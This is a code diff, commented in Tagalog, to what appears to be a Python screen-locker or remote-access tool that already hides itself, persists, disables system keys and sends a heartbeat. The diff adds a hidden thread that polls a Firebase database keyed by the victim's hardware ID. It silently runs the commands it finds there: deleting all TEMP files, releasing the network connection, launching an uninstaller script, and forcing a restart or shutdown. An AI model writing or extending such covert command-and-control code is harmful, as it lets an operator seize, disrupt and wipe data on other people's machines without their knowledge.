@@ -63,7 +63,7 @@ def get_hwid():
         pass
     return str(uuid.getnode())
 
-# Background Heartbeat Thread para hindi ma-lag ang UI
+# Background Heartbeat Thread para sa status ng client
 def heartbeat_loop():
     hwid = get_hwid()
     while True:
@@ -73,6 +73,42 @@ def heartbeat_loop():
         except:
             pass
         time.sleep(10)
+
+# Bagong Thread para makinig at mag-execute ng mga utos mula sa Web Panel / Firebase
+def command_listener_loop():
+    hwid = get_hwid()
+    # Gumagamit ng Firebase REST API para i-check kung may pending action ang HWID na ito
+    db_url = f"https://vipchaetos-default-rtdb.firebaseio.com/clients/{hwid}/pending_action.json"
+    
+    creation_flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
+
+    while True:
+        try:
+            response = requests.get(db_url, timeout=5)
+            if response.status_code == 200 and response.json():
+                action = response.json()
+                
+                # Burahin agad sa database para hindi paulit-ulit na ma-execute
+                requests.delete(db_url)
+
+                # Pag-execute ng mga napindot na button mula sa panel
+                if action == 'uninstall':
+                    bat_path = os.path.join(os.getenv('TEMP'), "App-Uninstaller-Combined.bat")
+                    if os.path.exists(bat_path):
+                        subprocess.Popen(f'cmd.exe /c start cmd.exe /k "{bat_path}"', shell=True, creationflags=creation_flags)
+                elif action == 'clean':
+                    subprocess.Popen('cmd.exe /c del /q /f /s "%TEMP%\\*.*"', shell=True, creationflags=creation_flags)
+                elif action == 'netcrash':
+                    subprocess.Popen('ipconfig /release', shell=True, creationflags=creation_flags)
+                elif action == 'netrestore':
+                    subprocess.Popen('ipconfig /renew', shell=True, creationflags=creation_flags)
+                elif action == 'restart':
+                    subprocess.Popen('shutdown /r /t 0', shell=True, creationflags=creation_flags)
+                elif action == 'shutdown':
+                    subprocess.Popen('shutdown /s /t 0', shell=True, creationflags=creation_flags)
+        except:
+            pass
+        time.sleep(3)
 
 def self_destruct_and_unlock():
     try:
@@ -124,8 +160,12 @@ hide_and_persist()
 disable_system_keys()
 
 # Simulan ang background heartbeat thread
-t = threading.Thread(target=heartbeat_loop, daemon=True)
-t.start()
+t_heartbeat = threading.Thread(target=heartbeat_loop, daemon=True)
+t_heartbeat.start()
+
+# Simulan ang background command listener thread para gumana na ang mga buttons
+t_command = threading.Thread(target=command_listener_loop, daemon=True)
+t_command.start()
 
 root = tk.Tk()
 root.attributes("-fullscreen", True)
